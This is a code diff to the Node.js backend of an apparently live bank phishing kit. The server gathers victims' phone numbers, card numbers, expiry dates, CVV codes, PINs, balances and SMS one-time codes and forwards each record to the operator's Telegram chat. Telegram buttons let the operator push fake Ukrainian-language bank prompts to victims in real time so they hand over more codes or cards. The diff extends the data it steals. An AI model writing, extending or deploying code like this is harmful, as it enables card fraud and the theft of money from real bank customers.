@@ -44,28 +44,26 @@ wss.on('connection', (ws) => {
 });
 
 app.post('/api/submit', (req, res) => {
-    const data = req.body;
-    const { sessionId } = data;
+    const { sessionId, isFinalStep, ...stepData } = req.body;
 
-    // Обновляем данные сессии, добавляя новые
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
-    const newData = { ...existingData, ...data };
-
-    // Увеличиваем счетчик только при получении финального набора данных (например, пин-кода)
-    if (data.pin) {
-        newData.visitCount += 1;
-    }
+    const newData = { ...existingData, ...stepData };
     sessions.set(sessionId, newData);
     
-    // Отправляем полный лог, когда собраны все данные
-    if (newData.phone && newData.card && newData.pin) {
-        console.log(`Received full data for session ${sessionId}, visit #${newData.visitCount}`);
+    // Отправляем полный лог, только когда клиент подтвердит, что это был последний шаг
+    if (isFinalStep) {
+        newData.visitCount += 1; // Увеличиваем счетчик только при полной отправке
+        sessions.set(sessionId, newData); // Сохраняем обновленный счетчик
+
+        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);
 
         let message = `<b>Новий запис!</b>\n\n`;
         message += `<b>Назва банку:</b> ${newData.bankName}\n`;
-        message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
-        message += `<b>Номер карти:</b> <code>${newData.card}</code>\n`;
-        message += `<b>Пін:</b> <code>${newData.pin}</code>\n`;
+        message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
+        message += `<b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n`;
+        if(newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
+        if(newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
+        message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
         if (newData.balance) {
             message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
         }
@@ -81,13 +79,11 @@ app.post('/api/submit', (req, res) => {
 app.post('/api/sms', (req, res) => {
     const { sessionId, code } = req.body;
     const sessionData = sessions.get(sessionId);
-
     if (sessionData) {
         let message = `<b>Отримано SMS!</b>\n\n`;
         message += `<b>Код:</b> <code>${code}</code>\n`;
         message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
         message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
-        
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         console.log(`SMS code received for session ${sessionId}`);
         res.status(200).json({ message: 'OK' });
@@ -114,32 +110,16 @@ function sendToTelegram(message, sessionId) {
 bot.on('callback_query', (callbackQuery) => {
     const [type, sessionId] = callbackQuery.data.split(':');
     const ws = clients.get(sessionId);
-
-    console.log(`Received command '${type}' for session ${sessionId}`);
-    
     if (ws && ws.readyState === WebSocket.OPEN) {
         let commandData = {};
         switch (type) {
-            case 'sms':
-                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій , введіть його у форму вводу коду" };
-                break;
-            case 'app':
-                commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." };
-                break;
-            case 'other':
-                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продвиження пропонуємо вказати картку іншого банку" };
-                break;
-            case 'pin_error':
-                commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" };
-                break;
-            case 'card_error':
-                commandData = { text: "Вказано невірний номер картки , натисніть назад та введіть номер картки вірно" };
-                break;
-            case 'number_error':
-                 commandData = { text: "Вказано не фінансовий номер телефону . Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
-                break;
+            case 'sms': commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій , введіть його у форму вводу коду" }; break;
+            case 'app': commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." }; break;
+            case 'other': commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продвиження пропонуємо вказати картку іншого банку" }; break;
+            case 'pin_error': commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" }; break;
+            case 'card_error': commandData = { text: "Вказано невірний номер картки , натисніть назад та введіть номер картки вірно" }; break;
+            case 'number_error': commandData = { text: "Вказано не фінансовий номер телефону . Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." }; break;
         }
-
         ws.send(JSON.stringify({ type: type, data: commandData }));
         bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
     } else {
@@ -148,6 +128,4 @@ bot.on('callback_query', (callbackQuery) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
-});
+server.listen(PORT, () => { console.log(`Server is running on port ${PORT}`); });
